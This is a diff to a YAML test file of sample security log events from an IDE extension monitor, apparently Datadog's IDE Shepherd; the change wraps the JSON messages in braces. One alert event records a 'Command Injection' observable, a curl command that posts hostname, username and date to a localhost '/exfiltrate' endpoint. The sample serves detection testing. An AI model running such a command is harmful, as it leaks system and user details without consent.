@@ -90,6 +90,7 @@ tests:
         time: 1769418941951
         type_uid: 200702
     message: |-
+      {
         "isAlert" : false,
         "category_uid" : 2,
         "metadata" : {
@@ -130,6 +131,7 @@ tests:
             "list" : [ "127.0.0.1" ]
           }
         }
+      }
     tags:
      - "source:LOGS_SOURCE"
     timestamp: 1769418941951
@@ -227,48 +229,50 @@ tests:
         time: 1768318612012
         type_uid: 200401
     message: |-
-      "isAlert" : true,
-      "category_uid" : 2,
-      "metadata" : {
-        "product" : {
-          "name" : "IDE Shepherd",
-          "vendor_name" : "Datadog"
+      {
+        "isAlert" : true,
+        "category_uid" : 2,
+        "metadata" : {
+          "product" : {
+            "name" : "IDE Shepherd",
+            "vendor_name" : "Datadog"
+          },
+          "environment" : {
+            "ide_version" : "1.107.0",
+            "ide_flavor" : "vscode"
+          },
+          "version" : "1.6.0"
         },
-        "environment" : {
-          "ide_version" : "1.107.0",
-          "ide_flavor" : "vscode"
+        "resources" : [ {
+          "uid" : "lotm.mal-xt-poc-99.0.0",
+          "role_id" : 3
+        } ],
+        "network" : {
+          "ip" : {
+            "attributes" : [ {
+              "ip" : "127.0.0.1",
+              "source" : [ "tags" ]
+            } ],
+            "list" : [ "127.0.0.1" ]
+          }
         },
-        "version" : "1.6.0"
-      },
-      "resources" : [ {
-        "uid" : "lotm.mal-xt-poc-99.0.0",
-        "role_id" : 3
-      } ],
-      "network" : {
-        "ip" : {
-          "attributes" : [ {
-            "ip" : "127.0.0.1",
-            "source" : [ "tags" ]
-          } ],
-          "list" : [ "127.0.0.1" ]
-        }
-      },
-      "observables" : [ {
-        "type_id" : 99,
-        "name" : "Command Injection",
-        "value" : "curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"hostname\\\": \\\"$(hostname)\\\", \\\"username\\\": \\\"$(whoami)\\\", \\\"timestamp\\\": \\\"$(date)\\\"}\" http://localhost:55559/exfiltrate "
-      } ],
-      "finding_info" : {
-        "uid" : "fe018e8b-d950-4a91-9714-0601b8c5c66f",
-        "title" : "Security Detection: Command Injection",
-        "desc" : "Detected command injection attempt: curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"hostname\\\": \\\"$(hostname)\\\", \\\"username\\\": \\\"$(whoami)\\\", \\\"timestamp\\\": \\\"$(date)\\\"}\" http://localhost:55559/exfiltrate "
-      },
-      "status_id" : 1,
-      "activity_id" : 1,
-      "class_uid" : 2004,
-      "severity_id" : 4,
-      "time" : 1768318612012,
-      "type_uid" : 200401
+        "observables" : [ {
+          "type_id" : 99,
+          "name" : "Command Injection",
+          "value" : "curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"hostname\\\": \\\"$(hostname)\\\", \\\"username\\\": \\\"$(whoami)\\\", \\\"timestamp\\\": \\\"$(date)\\\"}\" http://localhost:55559/exfiltrate "
+        } ],
+        "finding_info" : {
+          "uid" : "fe018e8b-d950-4a91-9714-0601b8c5c66f",
+          "title" : "Security Detection: Command Injection",
+          "desc" : "Detected command injection attempt: curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"hostname\\\": \\\"$(hostname)\\\", \\\"username\\\": \\\"$(whoami)\\\", \\\"timestamp\\\": \\\"$(date)\\\"}\" http://localhost:55559/exfiltrate "
+        },
+        "status_id" : 1,
+        "activity_id" : 1,
+        "class_uid" : 2004,
+        "severity_id" : 4,
+        "time" : 1768318612012,
+        "type_uid" : 200401
+      }
     tags:
      - "source:LOGS_SOURCE"
     timestamp: 1768318612012
